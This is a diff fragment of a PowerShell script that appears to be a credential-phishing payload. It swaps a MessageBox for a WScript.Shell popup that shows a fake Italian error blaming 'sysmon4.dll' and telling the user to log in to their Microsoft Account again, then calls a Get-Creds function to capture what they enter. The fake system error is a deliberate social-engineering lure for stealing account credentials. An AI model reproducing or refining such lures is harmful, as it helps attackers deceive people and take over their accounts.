@@ -191,7 +191,12 @@ Caps-Off
 
 Add-Type -AssemblyName System.Windows.Forms
 
-[System.Windows.Forms.MessageBox]::Show("Errore con SYSMON4.dll, autenticarsi nuovamente a Microsoft Account")
+<#
+[System.Windows.Forms.MessageBox]::Show("Errore con sysmon4.dll, autenticarsi nuovamente a Microsoft Account")
+#>
+
+$wshell = New-Object -ComObject Wscript.Shell
+$wshell.Popup("Errore con sysmon4.dll, autenticarsi nuovamente a Microsoft Account",0,"Errore",0x0)
 
 $creds = Get-Creds
 
